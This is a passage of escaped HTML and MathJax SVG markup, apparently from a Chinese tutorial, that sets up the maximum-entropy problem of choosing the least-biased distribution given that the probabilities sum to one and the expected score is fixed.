243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z\"/></g></g></g></g></svg></mjx-container></span> 推出一组概率分布 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.439ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"12.84ex\" height=\"1.439ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 5675.2 636\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(939.6,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(1384.2,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(2323.8,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2768.4,0)\"><path data-c=\"2026\" d=\"M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4107.1,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(4551.8,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D436\" d=\"M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z\"/></g></g></g></g></svg></mjx-container></span> 。</p>\n<p>假设你只知道：</p>\n<ul>\n<li>这些概率应该满足约束：\n<ul>\n<li><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.663ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"9.532ex\" height=\"2.36ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 4213.1 1043.1\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"munder\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1089,-285.4) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(1549.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(2657.3,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(3713.1,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g></svg></mjx-container></span>（总和为 1）</li>\n<li><span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.663ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"11.566ex\" height=\"2.36ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 5112.1 1043.1\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"munder\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1089,-285.4) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(1549.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(2379.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(3453.3,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(4509.1,0)\"><path data-c=\"1D707\" d=\"M58 -216Q44 -216 34 -208T23 -186Q23 -176 96 116T173 414Q186 442 219 442Q231 441 239 435T249 423T251 413Q251 401 220 279T187 142Q185 131 185 107V99Q185 26 252 26Q261 26 270 27T287 31T302 38T315 45T327 55T338 65T348 77T356 88T365 100L372 110L408 253Q444 395 448 404Q461 431 491 431Q504 431 512 424T523 412T525 402L449 84Q448 79 448 68Q448 43 455 35T476 26Q485 27 496 35Q517 55 537 131Q543 151 547 152Q549 153 557 153H561Q580 153 580 144Q580 138 575 117T555 63T523 13Q510 0 491 -8Q483 -10 467 -10Q446 -10 429 -4T402 11T385 29T376 44T374 51L368 45Q362 39 350 30T324 12T288 -4T246 -11Q199 -11 153 12L129 -85Q108 -167 104 -180T92 -202Q76 -216 58 -216Z\"/></g></g></g></svg></mjx-container></span>（期望分数固定）</li>\n</ul></li>\n</ul>\n<p>你希望：</p>\n<ul>\n<li>选出在这些约束下，<strong>最“均匀”、最不带偏见</strong>的分布，也就是信息熵最大的分布。</li>\n</ul>\n<p>即求： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -2.827ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"21.353ex\" height=\"6.785ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1749.5 9438.2 2999\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"munder\"><g data-mml-node=\"mo\"><path data-c=\"6D\" d=\"M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z\"/><path data-c=\"61\" d=\"M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z\" transform=\"translate(833,0)\"/><path data-c=\"78\" d=\"M201 0Q189 3 102 3Q26 3 17 0H11V46H25Q48 47 67 52T96 61T121 78T139 96T160 122T180 150L226 210L168 288Q159 301 149 315T133 336T122 351T113 363T107 370T100 376T94 379T88 381T80 383Q74 383 44 385H16V431H23Q59 429 126 429Q219 429 229 431H237V385Q201 381 201 369Q201 367 211 353T239 315T268 274L272 270L297 304Q329 345 329 358Q329 364 327 369T322 376T317 380T310 384L307 385H302V431H309Q324 428 408 428Q487 428 493 431H499V385H492Q443 385 411 368Q394 360 377 341T312 257L296 236L358 151Q424 61 429 57T446 50Q464 46 499 46H516V0H510H502Q494 1 482 1T457 2T432 2T414 3Q403 3 377 3T327 1L304 0H295V46H298Q309 46 320 51T331 63Q331 65 291 120L250 175Q249 174 219 133T185 88Q181 83 181 74Q181 63 188 55T206 46Q208 46 208 23V0H201Z\" transform=\"translate(1333,0)\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(752.7,-611) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(2027.7,0)\"><g data-mml-node=\"mo\" transform=\"translate(0 -0.5)\"><path data-c=\"28\" d=\"M758 -1237T758 -1240T752 -1249H736Q718 -1249 717 -1248Q711 -1245 672 -1199Q237 -706 237 251T672 1700Q697 1730 716 1749Q718 1750 735 1750H752Q758 1744 758 1741Q758 1737 740 1713T689 1644T619 1537T540 1380T463 1176Q348 802 348 251Q348 -242 441 -599T744 -1218Q758 -1237 758 -1240Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(792,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"munder\" transform=\"translate(1736.7,0)\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(600,-1084.4) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g><g data-mml-node=\"msub\" transform=\"translate(3347.3,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mi\" transform=\"translate(4344,0)\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(5622,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"msub\" transform=\"translate(5788.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 